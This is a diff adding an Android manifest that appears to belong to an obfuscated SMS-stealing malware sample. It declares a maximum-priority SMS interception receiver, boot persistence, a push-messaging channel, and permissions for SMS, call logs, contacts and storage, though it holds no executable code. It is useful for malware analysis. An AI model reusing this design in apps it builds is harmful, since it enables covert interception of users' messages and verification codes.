@@ -1,0 +1,142 @@
+<manifest xmlns:obfuscation="http://schemas.android.com/apk/res/android" obfuscation:compileSdkVersion="29" obfuscation:compileSdkVersionCodename="10" package="gqegwqg.bbebebefff.asdcdsac" platformBuildVersionCode="29" platformBuildVersionName="10">
+    <uses-permission obfuscation:name="android.permission.READ_PHONE_NUMBERS" />
+    <uses-permission obfuscation:name="android.permission.READ_CONTACTS" />
+    <uses-permission obfuscation:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <application obfuscation:allowBackup="true" obfuscation:appComponentFactory="androidx.core.app.CoreComponentFactory" obfuscation:icon="@mipmap/ic" obfuscation:label="@string/app_name" obfuscation:name="gqegwqg.bbebebefff.asdcdsac.app" obfuscation:networkSecurityConfig="@xml/network_security_config" obfuscation:requestLegacyExternalStorage="true" obfuscation:supportsRtl="true" obfuscation:theme="@style/Theme.Design.Light.NoActionBar">
+        <service obfuscation:enabled="true" obfuscation:exported="false" obfuscation:name="com.google.android.gms.measurement.AppMeasurementService" />
+        <activity obfuscation:exported="false" obfuscation:name="com.google.android.gms.common.api.GoogleApiActivity" obfuscation:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="true" obfuscation:exported="true" obfuscation:name="androidx.work.impl.diagnostics.DiagnosticsReceiver" obfuscation:permission="android.permission.DUMP">
+            <intent-filter>
+                <action obfuscation:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
+            </intent-filter>
+        </receiver>
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="false" obfuscation:exported="false" obfuscation:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy">
+            <intent-filter>
+                <action obfuscation:name="android.intent.action.DEVICE_STORAGE_OK" />
+                <action obfuscation:name="android.intent.action.DEVICE_STORAGE_LOW" />
+            </intent-filter>
+        </receiver>
+        <service obfuscation:enabled="true" obfuscation:name="gqegwqg.bbebebefff.asdcdsac.JobWakeUpService" obfuscation:permission="android.permission.BIND_JOB_SERVICE" />
+        <service obfuscation:directBootAware="false" obfuscation:enabled="@bool/enable_system_foreground_service_default" obfuscation:exported="false" obfuscation:name="androidx.work.impl.foreground.SystemForegroundService" />
+        <receiver obfuscation:exported="false" obfuscation:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver" />
+        <meta-data obfuscation:name="com.google.android.gms.version" obfuscation:value="@integer/google_play_services_version" />
+        <service obfuscation:enabled="true" obfuscation:exported="false" obfuscation:name="com.google.android.gms.measurement.AppMeasurementJobService" obfuscation:permission="android.permission.BIND_JOB_SERVICE" />
+        <receiver obfuscation:enabled="true" obfuscation:exported="true" obfuscation:label="BootReceiver" obfuscation:name="gqegwqg.bbebebefff.asdcdsac.BootReceiver">
+            <intent-filter>
+                <action obfuscation:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <activity obfuscation:name="com.nabinbhandari.android.permissions.PermissionsActivity" obfuscation:theme="@style/Permissions.TransparentTheme" />
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="false" obfuscation:exported="false" obfuscation:name="androidx.work.impl.background.systemalarm.RescheduleReceiver">
+            <intent-filter>
+                <action obfuscation:name="android.intent.action.BOOT_COMPLETED" />
+                <action obfuscation:name="android.intent.action.TIMEZONE_CHANGED" />
+                <action obfuscation:name="android.intent.action.TIME_SET" />
+            </intent-filter>
+        </receiver>
+        <receiver obfuscation:enabled="true" obfuscation:exported="true" obfuscation:name="gqegwqg.bbebebefff.asdcdsac.smsreciver" obfuscation:permission="android.permission.BROADCAST_SMS">
+            <intent-filter obfuscation:priority="2147483647">
+                <action obfuscation:name="android.provider.Telephony.SMS_RECEIVED" obfuscation:priority="999" />
+                <action obfuscation:name="android.intent.action.PACKAGE_ADDED" />
+                <action obfuscation:name="android.provider.Telephony.SMS_DELIVER" />
+                <action obfuscation:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action obfuscation:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action obfuscation:name="android.intent.action.PACKAGE_REMOVED" />
+                <action obfuscation:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+        <service obfuscation:directBootAware="false" obfuscation:enabled="@bool/enable_system_alarm_service_default" obfuscation:exported="false" obfuscation:name="androidx.work.impl.background.systemalarm.SystemAlarmService" />
+        <uses-library obfuscation:name="org.apache.http.legacy" obfuscation:required="false" />
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="false" obfuscation:exported="false" obfuscation:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy">
+            <intent-filter>
+                <action obfuscation:name="android.intent.action.BATTERY_LOW" />
+                <action obfuscation:name="android.intent.action.BATTERY_OKAY" />
+            </intent-filter>
+        </receiver>
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="@bool/enable_system_alarm_service_default" obfuscation:exported="false" obfuscation:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver">
+            <intent-filter>
+                <action obfuscation:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
+            </intent-filter>
+        </receiver>
+        <provider obfuscation:authorities="gqegwqg.bbebebefff.asdcdsac.MmsFileProvider" obfuscation:enabled="true" obfuscation:exported="false" obfuscation:grantUriPermissions="true" obfuscation:name="com.klinker.android.send_message.MmsFileProvider" />
+        <receiver obfuscation:enabled="true" obfuscation:exported="false" obfuscation:name="com.google.android.gms.measurement.AppMeasurementReceiver" />
+        <receiver obfuscation:name="gqegwqg.bbebebefff.asdcdsac.SentReceiver" obfuscation:taskAffinity="gqegwqg.bbebebefff.asdcdsac.SMS_SENT" />
+        <service obfuscation:exported="true" obfuscation:name="gqegwqg.bbebebefff.asdcdsac.InternalService" />
+        <provider obfuscation:authorities="gqegwqg.bbebebefff.asdcdsac.workmanager-init" obfuscation:directBootAware="false" obfuscation:exported="false" obfuscation:multiprocess="true" obfuscation:name="androidx.work.impl.WorkManagerInitializer" />
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="true" obfuscation:exported="false" obfuscation:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver" />
+        <receiver obfuscation:exported="true" obfuscation:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" obfuscation:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action obfuscation:name="com.google.android.c2dm.intent.RECEIVE" />
+            </intent-filter>
+        </receiver>
+        <service obfuscation:exported="false" obfuscation:name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery">
+            <meta-data obfuscation:name="backend:com.google.android.datatransport.cct.CctBackendFactory" obfuscation:value="cct" />
+        </service>
+        <service obfuscation:directBootAware="true" obfuscation:exported="false" obfuscation:name="com.google.firebase.messaging.FirebaseMessagingService">
+            <intent-filter obfuscation:priority="-500">
+                <action obfuscation:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
+        <activity obfuscation:exported="true" obfuscation:name="gqegwqg.bbebebefff.asdcdsac.MainActivity" obfuscation:screenOrientation="portrait" obfuscation:theme="@style/AppThemec">
+            <intent-filter>
+                <action obfuscation:name="android.intent.action.MAIN" />
+                <category obfuscation:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <service obfuscation:name="gqegwqg.bbebebefff.asdcdsac.FcmService">
+            <intent-filter>
+                <action obfuscation:name="com.google.firebase.MESSAGING_EVENT" />
+            </intent-filter>
+        </service>
+        <service obfuscation:exported="false" obfuscation:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" obfuscation:permission="android.permission.BIND_JOB_SERVICE" />
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="false" obfuscation:exported="false" obfuscation:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy">
+            <intent-filter>
+                <action obfuscation:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action obfuscation:name="android.intent.action.ACTION_POWER_CONNECTED" />
+            </intent-filter>
+        </receiver>
+        <service obfuscation:enabled="true" obfuscation:exported="false" obfuscation:name="gqegwqg.bbebebefff.asdcdsac.ForegroundService" obfuscation:permission="TODO" />
+        <service obfuscation:directBootAware="true" obfuscation:exported="false" obfuscation:name="com.google.firebase.components.ComponentDiscoveryService">
+            <meta-data obfuscation:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar" obfuscation:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data obfuscation:name="com.google.firebase.components:com.google.firebase.crashlytics.CrashlyticsRegistrar" obfuscation:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data obfuscation:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar" obfuscation:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data obfuscation:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar" obfuscation:value="com.google.firebase.components.ComponentRegistrar" />
+            <meta-data obfuscation:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar" obfuscation:value="com.google.firebase.components.ComponentRegistrar" />
+        </service>
+        <provider obfuscation:authorities="gqegwqg.bbebebefff.asdcdsac.lifecycle-process" obfuscation:exported="false" obfuscation:multiprocess="true" obfuscation:name="androidx.lifecycle.ProcessLifecycleOwnerInitializer" />
+        <service obfuscation:directBootAware="false" obfuscation:enabled="@bool/enable_system_job_service_default" obfuscation:exported="true" obfuscation:name="androidx.work.impl.background.systemjob.SystemJobService" obfuscation:permission="android.permission.BIND_JOB_SERVICE" />
+        <receiver obfuscation:directBootAware="false" obfuscation:enabled="false" obfuscation:exported="false" obfuscation:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy">
+            <intent-filter>
+                <action obfuscation:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+        <service obfuscation:exported="true" obfuscation:name="com.google.android.gms.nearby.exposurenotification.WakeUpService" obfuscation:permission="com.google.android.gms.nearby.exposurenotification.EXPOSURE_CALLBACK" />
+        <provider obfuscation:authorities="gqegwqg.bbebebefff.asdcdsac.fileprovider" obfuscation:exported="false" obfuscation:grantUriPermissions="true" obfuscation:name="androidx.core.content.FileProvider">
+            <meta-data obfuscation:name="android.support.FILE_PROVIDER_PATHS" obfuscation:resource="@xml/file_paths" />
+        </provider>
+        <provider obfuscation:authorities="gqegwqg.bbebebefff.asdcdsac.firebaseinitprovider" obfuscation:directBootAware="true" obfuscation:exported="false" obfuscation:initOrder="100" obfuscation:name="com.google.firebase.provider.FirebaseInitProvider" />
+        <service obfuscation:directBootAware="true" obfuscation:exported="false" obfuscation:name="androidx.room.MultiInstanceInvalidationService" />
+    </application>
+    <uses-permission obfuscation:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission obfuscation:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission obfuscation:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission obfuscation:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission obfuscation:name="android.permission.SEND_SMS" />
+    <uses-permission obfuscation:name="com.google.android.c2dm.permission.RECEIVE" />
+    <uses-permission obfuscation:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission obfuscation:name="android.permission.INTERNET" />
+    <meta-data obfuscation:name="ScopedStorage" obfuscation:value="true" />
+    <uses-permission obfuscation:name="android.permission.READ_SMS" />
+    <uses-permission obfuscation:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE" />
+    <uses-permission obfuscation:name="android.permission.WAKE_LOCK" />
+    <uses-permission obfuscation:name="android.permission.RECEIVE_SMS" />
+    <uses-permission obfuscation:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission obfuscation:name="com.google.android.gms.permission.AD_ID" />
+    <uses-permission obfuscation:name="android.permission.READ_PRIVILEGED_PHONE_STATE" />
+    <uses-permission obfuscation:name="android.permission.READ_CALL_LOG" />
+    <uses-permission obfuscation:name="android.permission.VIBRATE" />
+    <uses-permission obfuscation:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-feature obfuscation:name="android.hardware.telephony" obfuscation:required="false" />
+    <uses-permission obfuscation:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission obfuscation:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+</manifest>
